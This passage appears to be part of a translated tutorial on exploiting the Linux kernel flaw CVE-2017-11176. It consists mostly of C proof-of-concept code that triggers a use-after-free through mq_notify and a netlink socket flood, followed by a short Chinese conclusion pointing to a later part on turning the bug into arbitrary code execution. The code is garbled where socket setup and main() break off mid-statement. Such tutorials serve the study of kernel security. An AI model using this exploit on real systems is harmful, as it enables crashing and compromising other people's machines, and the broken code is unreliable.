    // avoid library wrappers
    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
    #define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
    #define _setsockopt(sockfd, level, optname, optval, optlen) \
      syscall(__NR_setsockopt, sockfd, level, optname, optval, optlen)
    #define _getsockopt(sockfd, level, optname, optval, optlen) \
      syscall(__NR_getsockopt, sockfd, level, optname, optval, optlen)
    #define _dup(oldfd) syscall(__NR_dup, oldfd)
    #define _close(fd) syscall(__NR_close, fd)
    #define _sendmsg(sockfd, msg, flags) syscall(__NR_sendmsg, sockfd, msg, flags)
    #define _bind(sockfd, addr, addrlen) syscall(__NR_bind, sockfd, addr, addrlen)
    // ----------------------------------------------------------------------------    
    #define PRESS_KEY() \
      do { printf("[ ] press key to continue...\n"); getchar(); } while(0)
    // ============================================================================
    // ----------------------------------------------------------------------------    // ============================================================================
    struct unblock_thread_arg
    {
      int sock_fd;
      int unblock_fd;
      bool is_ready; // we can use pthread barrier instead
    };
    // ----------------------------------------------------------------------------    
    static void* unblock_thread(void *arg)
    {
      struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
      int val = 3535; // need to be different than zero
      // notify the main thread that the unblock thread has been created. It *must*
      // directly call mq_notify().
      uta->is_ready = true; 
      sleep(5); // gives some time for the main thread to block
      printf("[ ][unblock] closing %d fd\n", uta->sock_fd);
      _close(uta->sock_fd);
      printf("[ ][unblock] unblocking now\n");
      if (_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("[+] setsockopt");
      return NULL;
    }
    // ----------------------------------------------------------------------------    
    static int decrease_sock_refcounter(int sock_fd, int unblock_fd)
    {
      pthread_t tid;
      struct sigevent sigev;
      struct unblock_thread_arg uta;
      char sival_buffer[NOTIFY_COOKIE_LEN];
      // initialize the unblock thread arguments
      uta.sock_fd = sock_fd;
      uta.unblock_fd = unblock_fd;
      uta.is_ready = false;
      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;
      sigev.sigev_signo = uta.sock_fd;
      printf("[ ] creating unblock thread...\n");
      if ((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
      {
        perror("[-] pthread_create");
        goto fail;
      }
      while (uta.is_ready == false) // spinlock until thread is created
        ;
      printf("[+] unblocking thread has been created!\n");
      printf("[ ] get ready to block\n");
      if ((_mq_notify((mqd_t)-1, &sigev) != -1) || (errno != EBADF))
      {
        perror("[-] mq_notify");
        goto fail;
      }
      printf("[+] mq_notify succeed\n");
      return 0;
    fail:
      return -1;
    }
    // ============================================================================
    // ----------------------------------------------------------------------------    // ============================================================================
    /*
     * Creates a netlink socket and fills its receive buffer.
     *
     * Returns the socket file descriptor or -1 on error.
     */
    static int prepare_blocking_socket(void)
    {
      int send_fd;
      int recv_fd;
      char buf[1024*10];
      int new_size = 0; // this will be reset to SOCK_MIN_RCVBUF
      struct sockaddr_nl addr = {
        .nl_family = AF_NETLINK,
        .nl_pad = 0,
        .nl_pid = 118, // must different than zero
        .nl_groups = 0 // no groups
      };
      struct iovec iov = {
        .iov_base = buf,
        .iov_len = sizeof(buf)
      };
      struct msghdr mhdr = {
        .msg_name = &addr,
        .msg_namelen = sizeof(addr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
        .msg_control = NULL,
        .msg_controllen = 0,
        .msg_flags = 0, 
      };
      printf("[ ] preparing blocking netlink socket\n");
      if ((send_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_USERSOCK))  0)
        ;
      if (errno != EAGAIN)
      {
        perror("[-] sendmsg");
        goto fail;
      }
      printf("[+] flood completed\n");
      _close(send_fd);
      printf("[+] blocking socket ready\n");
      return recv_fd;
    fail:
      printf("[-] failed to prepare block socket\n");
      return -1;
    }
    // ============================================================================
    // ----------------------------------------------------------------------------    // ============================================================================
    int main(void)
    {
      int sock_fd  = -1;
      int sock_fd2 = -1;
      int unblock_fd = 1;
      printf("[ ] -={ CVE-2017-11176 Exploit }=-\n");
      if ((sock_fd = prepare_blocking_socket()) >>
从现在开始，直到exp最终完成，每次运行PoC系统都会崩溃。这很烦人，但你会习惯的。可以通过禁止不必要的服务（例如图形界面等）来加快启动时间。记得最后重新启用这些服务，以匹配你的“真正”目标（他们也确实对内核有影响）。
# 结论
本文介绍了调度器子系统，任务状态以及如何通过等待队列在正在运行/等待状态之间转换。理解这部分有助于唤醒主线并赢得竞态条件。
通过close()和dup()系统调用，使第二次调用fget()返回NULL，这是触发漏洞所必需的。最后，研究了如何使netlink_attachskb()返回1。
所有这些组合起来成了最终的PoC，可以在不使用System Tap的情况下可靠地触发漏洞并使内核崩溃。
[接下来的文章](https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html)将讨论一个重要的话题：释放后重用漏洞的利用。将阐述slab分配器的基础知识，类型混淆，重新分配以及如何通过它来获得任意调用。将公开一些有助于构建和调试漏洞的新工具。最后，我们会在合适的时候让内核崩溃。